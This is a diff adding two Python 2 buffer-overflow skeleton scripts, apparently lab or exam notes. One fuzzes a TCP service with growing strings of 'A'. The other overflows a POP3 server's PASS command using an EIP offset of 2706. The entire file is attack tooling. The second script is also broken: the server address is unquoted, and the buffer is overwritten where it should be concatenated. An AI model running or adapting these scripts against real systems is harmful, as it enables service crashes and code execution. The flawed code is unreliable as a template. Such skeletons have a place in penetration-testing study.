@@ -1,0 +1,62 @@
+BoF Skel Files:
+
+*********************************************************************************
+#!/usr/bin/python
+import socket
+ 
+buffer=["A"]
+counter=100
+ 
+while len(buffer) <= 60:
+    buffer.append("A"*counter)
+    counter=counter+100
+ 
+try:
+    for string in buffer:
+        print "Fuzzing with %s bytes" % len(string)
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect=s.connect(('192.168.30.111',4455))
+        s.recv(1024)
+        s.send(string + '\r\n')
+        s.close()
+ 
+except:
+    print "Could not connect to application! Crash?"
+
+*********************************************************************************
+
+#!/usr/bin/env python2
+
+import socket
+
+# Server Address
+server = 172.16.136.158
+# Server Port
+port = 110
+
+buflen = 3000
+# Fuzzing Strings
+buffer = 'A' * 2706 # Buffer
+buffer = 'B' * 4 # EIP location
+buffer = 'C' * (buflen - len(buffer))
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = s.connect((server, port))
+
+    # Receive server header
+    r = s.recv(1024)
+
+    # Send command
+    s.send("USER Bob \r\n")
+
+    # Receive the server response
+    r = s.recv(1024)
+
+    # Send buffer to vulnerable command
+    s.send("PASS " + buffer + "\r\n")
+except:
+    print"Connection Error"
+    
+*********************************************************************************
+
